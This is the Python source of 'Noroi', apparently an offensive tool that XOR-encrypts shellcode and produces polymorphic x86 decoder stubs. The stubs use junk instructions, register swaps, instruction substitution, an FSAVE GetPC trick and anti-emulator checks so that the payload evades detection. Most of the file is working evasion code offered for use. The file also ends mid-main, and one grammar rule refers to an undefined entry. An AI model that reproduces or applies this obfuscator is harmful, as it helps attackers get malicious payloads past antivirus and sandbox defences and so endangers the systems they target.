"""
Noroi, Polymorphic Decoder Generator
Coded By Shahriyar Jalayeri

Suported Methods :
    * Register Swap
    * Instruction Substitute
    * Random XOR key
    * Random junk insertation

Version 0.1 :
    * Initial development.

Version 0.2 :
    * added more garbages
    * added FPU garbages
    * changed FlagGarbages to use FPU garbages
"""

import random, sys, getopt, subprocess
from collections import defaultdict
from os import system

NoroiVersion = "0.2"
class Morpher(object):
    def __init__(self):
        self.prod = defaultdict(list)

    def add_prod(self, lhs, rhs):
        """ Add production to the grammar. 'rhs' can
            be several productions separated by '|'.
            Each production is a sequence of symbols
            separated by whitespace.

            Usage:
                grammar.add_prod('NT', 'VP PP')
                grammar.add_prod('Digit', '1|2|3|4')
        """
        prods = rhs.split('|')
        for prod in prods:
            self.prod[lhs].append(tuple(prod.split()))

    def genRandomInstance(self, symbol):
        """ Generate a random sentence from the
            grammar, starting with the given
            symbol.
        """
        sentence = ''

        # select one production of this symbol randomly
        rand_prod = random.choice(self.prod[symbol])

        for sym in rand_prod:
            # for non-terminals, recurse
            if sym in self.prod:
                sentence += self.gen_random(sym)
            else:
                sentence += sym + ' '

        return sentence

    def genRandomInstanceConvergent(self,
          symbol,
          cfactor=0.25,
          pcount=defaultdict(int)
      ):
      """ Generate a random sentence from the
          grammar, starting with the given symbol.

          Uses a convergent algorithm - productions
          that have already appeared in the
          derivation on each branch have a smaller
          chance to be selected.

          cfactor - controls how tight the
          convergence is. 0 < cfactor < 1.0

          pcount is used internally by the
          recursive calls to pass on the
          productions that have been used in the
          branch.
      """
      sentence = ''

      # The possible productions of this symbol are weighted
      # by their appearance in the branch that has led to this
      # symbol in the derivation
      #
      weights = []
      for prod in self.prod[symbol]:
          if prod in pcount:
              weights.append(cfactor ** (pcount[prod]))
          else:
              weights.append(1.0)

      rand_prod = self.prod[symbol][weightedChoice(weights)]

      # pcount is a single object (created in the first call to
      # this method) that's being passed around into recursive
      # calls to count how many times productions have been
      # used.
      # Before recursive calls the count is updated, and after
      # the sentence for this call is ready, it is rolled-back
      # to avoid modifying the parent's pcount.
      #
      pcount[rand_prod] += 1

      for sym in rand_prod:
          # for non-terminals, recurse
          if sym in self.prod:
              sentence += self.genRandomInstanceConvergent(
                                  sym,
                                  cfactor=cfactor,
                                  pcount=pcount)
          else:
              sentence += sym + ' '

      # backtracking: clear the modification to pcount
      pcount[rand_prod] -= 1
      return sentence

def weightedChoice(weights):
    rnd = random.random() * sum(weights)
    for i, w in enumerate(weights):
        rnd -= w
        if rnd < 0:
            return i

def getRandomFixRegister( items ):
    # pick an item index
    random.shuffle( items )
    if items:
        index = random.randrange( len(items) )
        return items.pop(index)
    # nothing left!
    return None

def getSpeRandomFixRegister( items ):
    # pick an item index
    random.shuffle( items )
    if items:
        while True:
            index = random.randrange( len(items) )
            if items[index] != "ESI" and items[index] != "EDI" and items[index] != "EBP" :
                return items.pop(index)
    # nothing left!
    return None

def getRandomRegister( items ):
    # pick an item index
    random.shuffle( items )
    if items:
        return random.choice(items)
    # nothing left!
    return None

def RoundUpTo( number, multiple ) :
	if multiple == 0 :
		return number
		
	remainder = number % multiple; 
	if remainder == 0 :
		return number

	return number + multiple - remainder
	
def getRandomFPUImidiate() :
	return RoundUpTo( random.choice(range(15, 64)), 4 )

def getShellcodeArray( encryptionKey , shellFile ) :

    shellcodeArray = bytearray(open(shellFile, "rb").read())
    shellcodeArray = bytearray(( (shellcodeArray[i] ^ encryptionKey) for i in range(0,len(shellcodeArray)) ))
    shellcodeArray = "".join("0x%02X, " % byte for byte in shellcodeArray)

    return shellcodeArray
     



def genNewShellcodeEncoder( inputShellcodeFile ) :

    """
    Original decoder :

    BITS 32
    %define OrginalShellcode 0x11, 0x22, 0x33, 0x44, 0x55, 0x66

    CHECK_FOR_EMU:                          ; Find ntdll's InInitOrder list of modules:
        XOR     EAX, EAX                    ; EAX = 0
        MOV     EAX, [FS:EAX + 0x30]        ; EAX = &(PEB) ([FS:0x30])
        MOV     EAX, [EAX + 0x0C]           ; EAX = PEB->Ldr
        MOV     EAX, [EAX + 0x1C]           ; EAX = PEB->Ldr.InInitOrder (first module)
	    MOV     EBX, [EAX + 0x08]           ; EBX = InInitOrder[X].base_address
	    XOR     ECX, ECX
	    CMP     EBX, 0x00
	    JNZ     GO_DECODE
    EMU_CHECK:
	    IN AX, 0x41
    GO_DECODE:
	    FSAVE [ESP-0x10]
		JMP DECODE_BASE
        db      OrginalShellcode
    DECODE_BASE:
		MOV EAX, [ESP-4]
		ADD EAX, 12                         ; EAX = &(OrginalShellcode)
    EMU_CHECK:
        MOV EBX, [0x7ffe002c]
        CMP EBX, 0x014c014c
        JZ DECODE_SHELLCODE
        IN AX, 0x41
    DECODE_SHELLCODE:
	    MOV     BL, [EAX]
	    XOR     BL, 0xCC                    ; Encryption Key
	    MOV     [EAX], BL
	    INC     EAX
	    INC     ECX
	    CMP     ECX, 0x06
	    JNZ     DECODE_SHELLCODE
	    SUB     EAX, 0x06
	    JMP     EAX
    """

    randomRegister         = "RR"
    randomRegLow           = "REG2_LOW8"
    fixRegisters           = [ "R1", "R2", "R3" ]
    registerTable32        = [ "EAX", "EBX", "ECX", "EDX", "ESI", "EDI" , "EBP" ]
    registerTableLow8      = { "EAX" : "AL", "EBX" : "BL", "ECX" : "CL", "EDX" : "DL" }
    randomLowIntValues     = "RI_LOW"
    randomHighIntValues    = "RI_HI"
    cryptoKey              = "EncryptionKey"
    shellcodeSize          = "ShellcodeSize"
    shellcodeArray         = "ShellArray"
    fpuRandomImm           = "FPU_RI"
    fpuRandomImmRes        = "FPU_RES"

    FPU_SUB_BASE           = 4
    FPU_OFFSET_BASE        = 16

    instrunctionTable = {
    "GARB_INST_0" : "XCHG RR, RR",
    "GARB_INST_1" : "CMOVBE RR, RR",
    "GARB_INST_2" : "OR RR, RI_HI",
    "GARB_INST_3" : "SUB RR, RR",
    "GARB_INST_4" : "XOR RR, RR",
    "GARB_INST_5" : "CMOVE RR, RR",
    "GARB_INST_6" : "BT RR, RR",
    "GARB_INST_7" : "CRC32 RR, RR",
    "GARB_INST_8" : "TEST RR, RI_HI",
    "GARB_INST_9" : "CMOVB RR, RR",
    "GARB_INST_10" : "CMOVNBE RR, RR",
    "GARB_INST_11" : "XADD RR, RR",
    "GARB_INST_12" : "INC RR",
    "GARB_INST_13" : "MOV RR, RR",
    "GARB_INST_14" : "CMOVC RR, RR",
    "GARB_INST_15" : "LEA RR, [RR - RI_LOW]",
    "GARB_INST_16" : "LEA RR, [RR + RI_LOW]",
    "GARB_INST_17" : "CMOVLE RR, RR",
    "GARB_INST_18" : "SHL RR,RI_LOW",
    "GARB_INST_19" : "CMOVA RR, RR",
    "GARB_INST_20" : "DEC RR",
    "GARB_INST_21" : "LEA RR, [RR]",
    "GARB_INST_22" : "CMOVL RR, RR",
    "GARB_INST_23" : "ADD RR, RI_HI",
    "GARB_INST_24" : "NEG RR",
    "GARB_INST_25" : "CMC",
    "GARB_INST_26" : "BTR RR, RR",
    "GARB_INST_27" : "SAL RR, RI_LOW",
    "GARB_INST_28" : "OR RR, RR",
    "GARB_INST_29" : "CLC",
    "GARB_INST_30" : "CMOVNA RR, RR",
    "GARB_INST_31" : "CMOVG RR, RR",
    "GARB_INST_32" : "XOR RR, RI_HI",
    "GARB_INST_33" : "CMP RR, RI_LOW",
    "GARB_INST_34" : "MOV RR, RI_HI",
    "GARB_INST_35" : "CMP RR, RR",
    "GARB_INST_36" : "AND RR, RI_HI",
    "GARB_INST_37" : "TEST RR, RR",
    "GARB_INST_38" : "CMOVAE RR, RR",
    "GARB_INST_39" : "AND RR, RR",
    "GARB_INST_40" : "NOP RR",
    "GARB_INST_41" : "SAR RR, RI_LOW",
    "GARB_INST_42" : "SUB RR, RI_HI",
    "GARB_INST_43" : "SHR RR,RI_LOW",
    "GARB_INST_44" : "NOT RR",
    "GARB_INST_45" : "ADD RR, RR",
    "GARB_INST_46" : "CMOVNAE RR, RR",
    "GARB_INST_47" : "PUSH RR -> POP RR",
    "GARB_INST_48" : "BTC RR, RR",
    "GARB_INST_49" : "CMOVGE RR, RR",
    "GARB_INST_50" : "fmul",
    "GARB_INST_51" : "fsincos",
    "GARB_INST_52" : "fpatan",
    "GARB_INST_53" : "fcompp",
    "GARB_INST_54" : "fsqrt",
    "GARB_INST_55" : "fnclex",
    "GARB_INST_56" : "fabs",
    "GARB_INST_57" : "fdivr",
    "GARB_INST_58" : "fcos",
    "GARB_INST_59" : "fincstp",
    "GARB_INST_60" : "fcom",
    "GARB_INST_61" : "fucompp",
    "GARB_INST_62" : "fxtract",
    "GARB_INST_63" : "fscale",
    "GARB_INST_64" : "fcomp",
    "GARB_INST_65" : "fldl2e",
    "GARB_INST_66" : "frndint",
    "GARB_INST_67" : "fldpi",
    "GARB_INST_68" : "fldl2t",
    "GARB_INST_69" : "fnclex",
    "GARB_INST_70" : "fprem1",
    "GARB_INST_71" : "fnop",
    "GARB_INST_72" : "fprem",
    "GARB_INST_73" : "fsub",
    "GARB_INST_74" : "fld1",
    "GARB_INST_75" : "fdecstp",
    "GARB_INST_76" : "fyl2x",
    "GARB_INST_77" : "fucomp",
    "GARB_INST_78" : "ftst",
    "GARB_INST_79" : "fptan",
    "GARB_INST_80" : "fldln2",
    "GARB_INST_81" : "fxam",
    "GARB_INST_82" : "fsin",
    "GARB_INST_83" : "f2xm1",
    "GARB_INST_84" : "fchs",
    "GARB_INST_85" : "fdiv",
    "GARB_INST_86" : "fyl2xp1",
    "GARB_INST_87" : "fucom",
    "GARB_INST_88" : "fadd",

    "HEAD": "BITS 32\n%define OrginalShellcode ShellArray",
	
	##################################################### Verified
	"FPU_INST_V1": "FLD1",
	"FPU_INST_V2": "FLDL2T",
	"FPU_INST_V3": "FLDL2E",
	"FPU_INST_V4": "FLDPI",
	"FPU_INST_V5": "FLDLG2",
	"FPU_INST_V6": "FLDLN2",
	"FPU_INST_V7": "FLDZ",

    ##################################################### Verified
    "INS1": "XOR  R1, R1",

    "INS1_V1": "XOR  RR, RR -> MOV R1, RR",
    "INS1_V2": "SUB  R1, R1",
    "INS1_V3": "XOR  RR, RR -> AND R1, RR",

    ##################################################### Verified
    "INS2": "MOV  R1, [FS:R1 + 0x30]",
    
    "INS2_V1": "XOR RR, RR -> MOV RR, R1 -> MOV  R1, [FS:RR + 0x30]",
    "INS2_V2": "MOV  RR, [FS:R1 + 0x30] -> MOV R1, RR",
    "INS2_V3": "MOV RR, R1 -> MOV  RR, [FS:RR + 0x30] -> XOR RR, RI_LOW -> MOV R1, RR -> XOR R1, RI_LOW",

    ##################################################### Verified
    "INS3": "MOV  R1, [R1 + 0x0C]",
    
    "INS3_V1": "MOV RR, 0x0C -> MOV  R1, [R1 + RR]",
    "INS3_V2": "MOV RR, 0x0C -> XOR RR, RI_LOW -> XOR RR, RI_LOW -> MOV  R1, [R1 + RR]",
    "INS3_V3": "MOV RR, 0x0C -> NOT RR -> NOT RR -> MOV  R1, [R1 + RR]",

    #################################################### Verified
    "INS4": "MOV  R1, [R1 + 0x1C]",
    
    "INS4_V1": "MOV RR, 0x1C -> MOV  R1, [R1 + RR]",
    "INS4_V2": "MOV RR, 0x1C -> XOR RR, RI_LOW -> XOR RR, RI_LOW -> MOV  R1, [R1 + RR]",
    "INS4_V3": "MOV RR, 0x1C -> NOT RR -> NOT RR -> MOV  R1, [R1 + RR]",

    #################################################### Verified
    "INS5": "MOV  R2, [R1 + 0x08]",
    
    "INS5_V1": "MOV RR, 0x08 -> MOV  R2, [R1 + RR]",
    "INS5_V2": "MOV RR, 0x08 -> XOR RR, RI_LOW -> XOR RR, RI_LOW -> MOV  R2, [R1 + RR]",
    "INS5_V3": "MOV RR, 0x08 -> NOT RR -> NOT RR -> MOV  R2, [R1 + RR]",


    #################################################### Verified
    "INS6": "XOR  R3, R3",
    
    "INS6_V1": "XOR  RR, RR -> MOV R3, RR",
    "INS6_V2": "SUB  R3, R3",
    "INS6_V3": "XOR  RR, RR -> AND R3, RR",

    ##################################################### Verified
    "INS7" : "CMP  R2, 0x00",

    "INS7_V1" : "XOR RR, RR -> CMP R2, RR",
    "INS7_V2" : "SUB RR, RR -> CMP R2, RR",
    "INS7_V3" : "MOV RR, 0xFFFFFFFF -> INC RR -> CMP R2, RR",

    ##################################################### Verified

	"INS8" : "JNZ  GO_DECODE",
    "INS9" : "EMU_CHECK:",
	#"INS10" : "JMP EMU_LOOP",
    "INS11" : "GO_DECODE:",

    # need a random FPU_INST before
    # can randomly choose FSAVE/FNSAVE 
	"INS12" : "FSAVE [ESP-FPU_RI] -> XOR RR, RR -> JZ DECODE_BASE", 
    "INS13" : "db  OrginalShellcode",

    "INS14" : "DECODE_BASE:",
    ##################################################### Verified
    # most add 15 to dest address to get the OrginalShellcode address
    # [2bytes FPU_INST] + [5bytes FSAVE ] + [2byte XOR] + [6bytes JUMP]= 15bytes

	"INS15" : "MOV R1, [ESP-FPU_RES] -> ADD R1, 15",

    ##################################################### Verified

	# this one is for x86 only
	"EMU_CHECK" : "MOV RR, [0x7ffe002c] -> CMP RR, 0x014c014c -> JZ DECODE_SHELLCODE",
	"EMU_PRIV_1"  : "IN AX, RI_LOW",
	"EMU_PRIV_2"  : "OUT RI_LOW, AX",
	
    "INS16" : "DECODE_SHELLCODE:",

    ##################################################### Verified
    "INS17" : "MOV  REG2_LOW8, [R1]",

    "INS17_V1" : "MOV RR, R1 -> MOV  REG2_LOW8, [RR]",
    "INS17_V2" : "PUSH R1 -> POP RR -> MOV  REG2_LOW8, [RR]",
    "INS17_V3" : "PUSH R1 -> POP RR -> MOV R1, RR -> MOV  REG2_LOW8, [RR]",

    ##################################################### Verified
	"INS18" : "XOR  REG2_LOW8, EncryptionKey",

    "INS18_V1" : "XOR RR, RR -> MOVZX RR, EncryptionKey -> XOR  REG2_LOW8, RR",
    "INS18_V2" : "SUB RR, RR -> PUSH EncryptionKey -> POP RR -> XOR  REG2_LOW8, RR",
    "INS18_V3" : "MOV RR, 0xFFFFFFFF -> ADD RR, 0x01 -> PUSH EncryptionKey -> POP RR -> XOR  REG2_LOW8, RR",

    ##################################################### Verified
	"INS19" : "MOV  [R1], REG2_LOW8",

    "INS19_V1" : "MOV RR, R1 -> MOV  [RR], REG2_LOW8",
    "INS19_V2" : "PUSH R1 -> POP RR -> MOV  [RR], REG2_LOW8",
    "INS19_V3" : "PUSH R1 -> POP RR -> MOV R1, RR -> MOV  [RR], REG2_LOW8",

    ##################################################### Verified
	"INS20" : "INC  R1", 
    
    "INS20_V1" : "XOR RR, RR -> INC RR -> ADD R1, RR",
    "INS20_V2" : "SUB RR, RR -> ADD RR, 0x01 -> ADD R1, RR",
    "INS20_V3" : "MOV RR, R1 -> INC RR -> MOV R1, RR",

    ##################################################### Verified
	"INS21" : "INC  R3",

    "INS21_V1" : "XOR RR, RR -> INC RR -> ADD R3, RR",
    "INS21_V2" : "SUB RR, RR -> ADD RR,0x01 -> ADD R3, RR",
    "INS21_V3" : "MOV RR, R3 -> INC RR -> MOV R3, RR",

    ##################################################### Verified
	"INS22" : "CMP  R3, ShellcodeSize",

    "INS22_V1" : "MOV RR, ShellcodeSize -> CMP R3, RR",
    "INS22_V2" : "SUB RR, RR -> MOV RR, ShellcodeSize -> CMP R3, RR",
    "INS22_V3" : "MOV RR, ShellcodeSize -> INC RR -> DEC RR -> CMP R3, RR",

    ##################################################### Verified

	"INS23" : "JNZ  DECODE_SHELLCODE",

    ##################################################### Verified
	"INS24" : "SUB  R1, ShellcodeSize",

    "INS24_V1" : "XOR RR, RR -> MOV RR, ShellcodeSize -> SUB R1, RR",
    "INS24_V2" : "PUSH ShellcodeSize -> POP RR -> SUB R1, RR",
    "INS24_V3" : "MOV RR, R1 -> SUB RR, ShellcodeSize -> MOV R1, RR",

    ##################################################### Verified
    "INS25" : "JMP  R1",

    "INS25_V1" : "PUSH  R1 -> RET",
    "INS25_V2" : "MOV RR, R1 -> JMP RR",
    "INS25_V3" : "PUSH R1 -> POP RR -> CALL RR",
    }

    morhpGrammer = Morpher()
    # shellcode  grammar
    morhpGrammer.add_prod("Start", "HEAD A")
    morhpGrammer.add_prod("GARB_INST", "GARB_INST_46 GARB_INST_42  | GARB_INST_3 GARB_INST_38 GARB_INST_15 GARB_INST_2  | GARB_INST_24  | GARB_INST_56 GARB_INST_61  | GARB_INST_29 GARB_INST_26 GARB_INST_65  | GARB_INST_66 GARB_INST_80 GARB_INST_52 GARB_INST_69  | GARB_INST_26 GARB_INST_27 GARB_INST_40 GARB_INST_46  | GARB_INST_24 GARB_INST_27  | GARB_INST_15 GARB_INST_67  | GARB_INST_32 GARB_INST_72  | GARB_INST_56 GARB_INST_10 GARB_INST_53  | GARB_INST_20 GARB_INST_62  | GARB_INST_45 GARB_INST_42  | GARB_INST_22 GARB_INST_71 GARB_INST_60  | GARB_INST_31 GARB_INST_64  | GARB_INST_52 GARB_INST_7 GARB_INST_10  | GARB_INST_23  | GARB_INST_0 GARB_INST_37  | GARB_INST_84 GARB_INST_8 GARB_INST_63  | GARB_INST_76 GARB_INST_83 GARB_INST_59 GARB_INST_56  | GARB_INST_69 GARB_INST_39  | GARB_INST_68 GARB_INST_43  | GARB_INST_82 GARB_INST_21  | GARB_INST_13 GARB_INST_83  | GARB_INST_36 GARB_INST_42 GARB_INST_6  | GARB_INST_10 GARB_INST_77  | GARB_INST_0 GARB_INST_71 GARB_INST_3 GARB_INST_2  | GARB_INST_58  | GARB_INST_13 GARB_INST_8  | GARB_INST_44 GARB_INST_63 GARB_INST_25 GARB_INST_22  | GARB_INST_84 GARB_INST_43  | GARB_INST_62 GARB_INST_31 GARB_INST_80  | GARB_INST_26 GARB_INST_68 GARB_INST_36 GARB_INST_8  | GARB_INST_60 GARB_INST_78 | GARB_INST_18 GARB_INST_3  | GARB_INST_17 GARB_INST_24  | GARB_INST_79  | GARB_INST_16 GARB_INST_29 GARB_INST_2  | GARB_INST_5  | GARB_INST_65 GARB_INST_66 GARB_INST_52  | GARB_INST_82 GARB_INST_84 GARB_INST_20  | GARB_INST_24 GARB_INST_72 GARB_INST_29 GARB_INST_17  | GARB_INST_35  | GARB_INST_71 GARB_INST_11 GARB_INST_19 GARB_INST_15  | GARB_INST_30  | GARB_INST_79 GARB_INST_16 GARB_INST_48  | GARB_INST_9 GARB_INST_12  | GARB_INST_81  | GARB_INST_12  | GARB_INST_31 GARB_INST_55 GARB_INST_15 GARB_INST_67  | GARB_INST_76  | GARB_INST_22  | GARB_INST_41 GARB_INST_51 GARB_INST_70 GARB_INST_31  | GARB_INST_60 GARB_INST_78 GARB_INST_40 GARB_INST_80  | GARB_INST_26 GARB_INST_3 GARB_INST_52  | GARB_INST_29  | GARB_INST_47 GARB_INST_20 GARB_INST_84 GARB_INST_80  | GARB_INST_13 GARB_INST_26  | GARB_INST_87 GARB_INST_14 GARB_INST_36  | GARB_INST_65 GARB_INST_27  | GARB_INST_80 GARB_INST_71 GARB_INST_10 GARB_INST_5  | GARB_INST_48  | GARB_INST_73 GARB_INST_1 GARB_INST_50 GARB_INST_12  | GARB_INST_47 GARB_INST_83 GARB_INST_46 GARB_INST_13  | GARB_INST_17 GARB_INST_80  | GARB_INST_77 GARB_INST_10  | GARB_INST_9 GARB_INST_16 GARB_INST_70  | GARB_INST_85 GARB_INST_19 GARB_INST_37  | GARB_INST_12 GARB_INST_34 GARB_INST_52  | GARB_INST_64 GARB_INST_43  | GARB_INST_73 GARB_INST_33  | GARB_INST_61 GARB_INST_82  | GARB_INST_50 GARB_INST_9 GARB_INST_34 GARB_INST_48")
    morhpGrammer.add_prod("FlagGarb", "GARB_INST_77 GARB_INST_60  | GARB_INST_82  | GARB_INST_73 GARB_INST_79  | GARB_INST_52 GARB_INST_87 GARB_INST_70  | GARB_INST_79  | GARB_INST_50  | GARB_INST_82 GARB_INST_76 GARB_INST_79  | GARB_INST_52 GARB_INST_63  | GARB_INST_63 GARB_INST_62 GARB_INST_87  | GARB_INST_54 GARB_INST_73  | GARB_INST_64 GARB_INST_72 GARB_INST_74 GARB_INST_83  | GARB_INST_66  | GARB_INST_86 GARB_INST_69 GARB_INST_80  | GARB_INST_69 GARB_INST_87 GARB_INST_64  | GARB_INST_68  | GARB_INST_70 GARB_INST_70 GARB_INST_85  | GARB_INST_51 GARB_INST_66  | GARB_INST_70 GARB_INST_59 GARB_INST_80 GARB_INST_65  | GARB_INST_57  | GARB_INST_68 GARB_INST_68 GARB_INST_79  | GARB_INST_84 GARB_INST_67  | GARB_INST_76  | GARB_INST_64 GARB_INST_80 GARB_INST_71 GARB_INST_57  | GARB_INST_79 GARB_INST_66  | GARB_INST_54  | GARB_INST_78 GARB_INST_62 GARB_INST_67 GARB_INST_83  | GARB_INST_71 GARB_INST_76 GARB_INST_54 GARB_INST_70  | GARB_INST_73 GARB_INST_70 GARB_INST_76 GARB_INST_85  | GARB_INST_85 GARB_INST_52 GARB_INST_85 GARB_INST_67  | GARB_INST_59 GARB_INST_62  | GARB_INST_56 GARB_INST_86  | GARB_INST_77  | GARB_INST_59 GARB_INST_56 GARB_INST_71  | GARB_INST_81 GARB_INST_76  | GARB_INST_60  | GARB_INST_80 GARB_INST_73 GARB_INST_86 GARB_INST_80  | GARB_INST_54 GARB_INST_55 GARB_INST_84 GARB_INST_57  | GARB_INST_72 GARB_INST_79 GARB_INST_64  | GARB_INST_74 GARB_INST_74  | GARB_INST_58 GARB_INST_68 GARB_INST_56  | GARB_INST_61 GARB_INST_82  | GARB_INST_61 GARB_INST_50 GARB_INST_51 GARB_INST_83  | GARB_INST_72 GARB_INST_52  | GARB_INST_81 GARB_INST_75  | GARB_INST_87 GARB_INST_82  | GARB_INST_53  | GARB_INST_67  | GARB_INST_82 GARB_INST_58  | GARB_INST_50 GARB_INST_82 GARB_INST_72 GARB_INST_70  | GARB_INST_73 GARB_INST_66  | GARB_INST_76 GARB_INST_53 GARB_INST_63 GARB_INST_65  | GARB_INST_77 GARB_INST_69  | GARB_INST_78 GARB_INST_50  | GARB_INST_82 GARB_INST_66  | GARB_INST_52 GARB_INST_81 GARB_INST_79 GARB_INST_59  | GARB_INST_64 GARB_INST_56 GARB_INST_84  | GARB_INST_64  | GARB_INST_85 GARB_INST_77 GARB_INST_56  | GARB_INST_76 GARB_INST_51 GARB_INST_64  | GARB_INST_54 GARB_INST_51 GARB_INST_50  | GARB_INST_74 GARB_INST_55 GARB_INST_81  | GARB_INST_55 GARB_INST_61 GARB_INST_70  | GARB_INST_53 GARB_INST_63 GARB_INST_82  | GARB_INST_86  | GARB_INST_50 GARB_INST_72 GARB_INST_56 GARB_INST_86  | GARB_INST_66  | GARB_INST_52 GARB_INST_57  | GARB_INST_63 GARB_INST_76  | GARB_INST_67 GARB_INST_52 GARB_INST_70 GARB_INST_70  | GARB_INST_72 GARB_INST_56  | GARB_INST_76 GARB_INST_75  | GARB_INST_75  | GARB_INST_74 GARB_INST_63 GARB_INST_84  | GARB_INST_72")
    morhpGrammer.add_prod("FPUInst", " FPU_INST_V1 | FPU_INST_V2 | FPU_INST_V3 | FPU_INST_V4 | FPU_INST_V5 | FPU_INST_V6 | FPU_INST_V7")
    morhpGrammer.add_prod("EmuPriv", " GARB_INST EMU_PRIV_1 | GARB_INST EMU_PRIV_2 | EMU_PRIV_1 GARB_INST | EMU_PRIV_2 GARB_INST ")
    morhpGrammer.add_prod("A", "GARB_INST  INS1 GARB_INST B | GARB_INST  INS1_V1 GARB_INST B | GARB_INST  INS1_V2 GARB_INST B | GARB_INST  INS1_V3 GARB_INST B")
    morhpGrammer.add_prod("B", "GARB_INST  INS2 GARB_INST C | GARB_INST  INS2_V1 GARB_INST C | GARB_INST  INS2_V2 GARB_INST C | GARB_INST  INS2_V3 GARB_INST C")
    morhpGrammer.add_prod("C", "GARB_INST  INS3 GARB_INST D | GARB_INST  INS3_V1 GARB_INST D | GARB_INST  INS3_V2 GARB_INST D | GARB_INST  INS3_V3 GARB_INST D")
    morhpGrammer.add_prod("D", "GARB_INST  INS4 GARB_INST E | GARB_INST  INS4_V1 GARB_INST E | GARB_INST  INS4_V2 GARB_INST E | GARB_INST  INS4_V3 GARB_INST E")
    morhpGrammer.add_prod("E", "GARB_INST  INS5 GARB_INST F | GARB_INST  INS5_V1 GARB_INST F | GARB_INST  INS5_V2 GARB_INST F | GARB_INST  INS5_V3 GARB_INST F")
    morhpGrammer.add_prod("F", "GARB_INST  INS6 GARB_INST G | GARB_INST  INS6_V1 GARB_INST G | GARB_INST  INS6_V2 GARB_INST G | GARB_INST  INS6_V3 GARB_INST G")
    morhpGrammer.add_prod("G", "GARB_INST  INS7 FlagGarb H | GARB_INST  INS7_V1 FlagGarb H | GARB_INST  INS7_V2 FlagGarb H | GARB_INST  INS7_V3 FlagGarb H")
    morhpGrammer.add_prod("H", "INS8 FlagGarb I")
    morhpGrammer.add_prod("I", "INS9 J")
    morhpGrammer.add_prod("J", "EmuPriv INS10 K")
    morhpGrammer.add_prod("K", "INS11 L")
    morhpGrammer.add_prod("L", "FPUInst INS12 M")
    morhpGrammer.add_prod("M", "INS13 N")
    morhpGrammer.add_prod("N", "INS14 O")
    morhpGrammer.add_prod("O", "INS15 EmuCheck")
    morhpGrammer.add_prod("EmuCheck", "EMU_CHECK EmuPriv P")
    morhpGrammer.add_prod("P", "INS16 Q")
    morhpGrammer.add_prod("Q", "GARB_INST  INS17 GARB_INST R | GARB_INST  INS17_V1 GARB_INST R | GARB_INST  INS17_V2 GARB_INST R | GARB_INST  INS17_V3 GARB_INST R")
    morhpGrammer.add_prod("R", "GARB_INST  INS18 GARB_INST S")
    morhpGrammer.add_prod("S", "GARB_INST  INS19 GARB_INST T | GARB_INST  INS19_V1 GARB_INST T | GARB_INST  INS19_V2 GARB_INST T | GARB_INST  INS19_V3 GARB_INST T")
    morhpGrammer.add_prod("T", "GARB_INST  INS20 GARB_INST U | GARB_INST  INS20_V1 GARB_INST U | GARB_INST  INS20_V2 GARB_INST U | GARB_INST  INS20_V3 GARB_INST U")
    morhpGrammer.add_prod("U", "GARB_INST  INS21 GARB_INST V | GARB_INST  INS21_V1 GARB_INST V | GARB_INST  INS21_V2 GARB_INST V | GARB_INST  INS21_V3 GARB_INST V")
    morhpGrammer.add_prod("V", "GARB_INST  INS22 FlagGarb W | GARB_INST  INS22_V1 FlagGarb W | GARB_INST  INS22_V2 FlagGarb W | GARB_INST  INS22_V3 FlagGarb W")
    morhpGrammer.add_prod("W", "INS23 X FlagGarb")
    morhpGrammer.add_prod("X", "GARB_INST  INS24 GARB_INST Y | GARB_INST  INS24_V1 GARB_INST Y | GARB_INST  INS24_V2 GARB_INST Y | GARB_INST  INS24_V3 GARB_INST Y")
    morhpGrammer.add_prod("Y", "GARB_INST  INS25 GARB_INST | GARB_INST  INS25_V1 GARB_INST | GARB_INST  INS25_V2 GARB_INST | GARB_INST  INS25_V3 GARB_INST ")

    # generate a shellcode based on grammar
    newShellcodeGenration = morhpGrammer.genRandomInstanceConvergent('Start')

    # change it to list
    newShellcodeGenration = newShellcodeGenration.split(" ")

    regFixList = []
    regFixLow8 = ""
    for reg in fixRegisters :
        if reg == "R2" : 
            regFixList.append(getSpeRandomFixRegister(registerTable32))
            regFixLow8 = registerTableLow8[regFixList[-1]]
        else :
            regFixList.append(getRandomFixRegister(registerTable32))
    


    index = 0
    for ident in newShellcodeGenration: 
        # replace random register and immediate values
        if instrunctionTable.has_key(ident) :
            new_inst = instrunctionTable[ident]
            new_inst = new_inst.replace(randomRegister, getRandomRegister(registerTable32) );
            new_inst = new_inst.replace(randomLowIntValues, str( random.choice(range(1, 255))));
            new_inst = new_inst.replace(randomHighIntValues, str( random.choice(range(0, 65536))));
            new_inst = new_inst + "\n"
            newShellcodeGenration[index] = new_inst
            index += 1
        else :
            newShellcodeGenration[index] = ""
            index += 1

    # change it to string
    newShellcodeGenration = ''.join(newShellcodeGenration)

    # replace fix register
    for reg in fixRegisters :
        newShellcodeGenration = newShellcodeGenration.replace( reg, regFixList.pop())

    newShellcodeGenration = newShellcodeGenration.replace( randomRegLow, regFixLow8)

    # replace key ,shellcode size and shellcode array
    encryptionKey         = random.choice(range(0, 255))
    orginalShellcode      = getShellcodeArray(encryptionKey , inputShellcodeFile)
    sizeOfRawShellcode    = orginalShellcode.count("0x")
    FloatingRandom        = getRandomFPUImidiate()
    FloatingOffset        = FPU_SUB_BASE + ( FloatingRandom - FPU_OFFSET_BASE )
    newShellcodeGenration = newShellcodeGenration.replace( fpuRandomImm, str(FloatingRandom))
    newShellcodeGenration = newShellcodeGenration.replace( fpuRandomImmRes, str(FloatingOffset))
    newShellcodeGenration = newShellcodeGenration.replace( cryptoKey, str(encryptionKey))
    newShellcodeGenration = newShellcodeGenration.replace( shellcodeSize, str(sizeOfRawShellcode))
    newShellcodeGenration = newShellcodeGenration.replace( shellcodeArray, orginalShellcode);
    newShellcodeGenration = newShellcodeGenration.replace( " -> ", "\n")

    return newShellcodeGenration

def usage() :
    print "Noroi.py [Options]\n"
    print "-v            \t print Noroi version"
    print "-s --shellcode\t input (unencrypted) shellcode file"
    print "-c --count    \t number of shellcodes to generate"

def main(argv):                         
    shellCount = 0;
    shellcodeFile = ""

    try:                                
        opts, args = getopt.getopt(argv, "hs:c:v", ["help", "shellcode=", "count=", "version"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        sys.exit(2)

    for opt, arg in opts:                
        if opt in ("-h", "--help"):      
            usage()                     
            sys.exit()                 
        elif opt in ("-c", "--count"):                
            shellCount = int(arg, 10)                                
        elif opt in ("-s", "--shellcode"): 
            shellcodeFile = arg    
        elif opt in ("-v", "--version"):           
            print "Noroi, Polymorphic Decoder Generator Version " + NoroiVersion
            print "GetPC Method : FSAVE"
            sys.exit()

